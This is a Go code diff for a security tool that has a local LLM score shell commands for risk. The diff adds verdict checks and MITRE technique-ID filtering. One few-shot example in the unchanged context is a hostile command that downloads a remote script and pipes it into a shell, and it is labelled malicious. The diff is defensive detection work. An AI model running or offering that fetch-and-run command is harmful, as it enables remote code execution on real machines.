@@ -12,6 +12,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"regexp"
 	"strings"
 	"time"
 
@@ -53,6 +54,27 @@ var fewShot = []struct {
 		Command: "bash -c curl -fsSL http://10.0.0.9/s.sh | sh",
 		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"remote script downloaded and piped straight into a shell","mitre":["T1059","T1105"],"risk_indicators":["curl|sh"]}`,
 	},
+	{
+		Command: "gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js",
+		JSON:    `{"risk_score":0.02,"verdict":"benign","reason":"GNOME desktop shell extension","mitre":[],"risk_indicators":[]}`,
+	},
+}
+
+// mitreRe matches valid MITRE ATT&CK technique IDs (e.g. T1059, T1059.004).
+var mitreRe = regexp.MustCompile(`^T\d{4}(\.\d{3})?$`)
+
+// validVerdicts is the allowed verdict label set.
+var validVerdicts = map[string]bool{"benign": true, "suspicious": true, "malicious": true}
+
+// keepValidMitre drops hallucinated/malformed technique IDs.
+func keepValidMitre(in []string) []string {
+	out := []string{}
+	for _, m := range in {
+		if m = strings.TrimSpace(m); mitreRe.MatchString(m) {
+			out = append(out, m)
+		}
+	}
+	return out
 }
 
 // ollamaClient scores commands via a local Ollama server running a small model.
@@ -76,6 +98,7 @@ type ollamaRequest struct {
 	Model   string         `json:"model"`
 	Prompt  string         `json:"prompt"`
 	Stream  bool           `json:"stream"`
+	Format  string         `json:"format,omitempty"`
 	Options map[string]any `json:"options"`
 }
 
@@ -89,7 +112,8 @@ func (c *ollamaClient) score(ctx context.Context, e types.Event) (scoreResult, e
 		Model:   c.model,
 		Prompt:  buildPrompt(e),
 		Stream:  false,
-		Options: map[string]any{"temperature": 0},
+		Format:  "json",
+		Options: map[string]any{"temperature": 0, "num_predict": 256},
 	})
 	if err != nil {
 		return scoreResult{}, err
@@ -170,15 +194,15 @@ func parseResult(text string) (scoreResult, error) {
 	if score > 1 {
 		score = 1
 	}
-	verdict := strings.TrimSpace(raw.Verdict)
-	if verdict == "" {
+	verdict := strings.ToLower(strings.TrimSpace(raw.Verdict))
+	if !validVerdicts[verdict] {
 		verdict = verdictForScore(score)
 	}
 	return scoreResult{
 		RiskScore:      score,
 		Verdict:        verdict,
 		Reason:         strings.TrimSpace(raw.Reason),
-		Mitre:          raw.Mitre,
+		Mitre:          keepValidMitre(raw.Mitre),
 		RiskIndicators: raw.RiskIndicators,
 	}, nil
 }
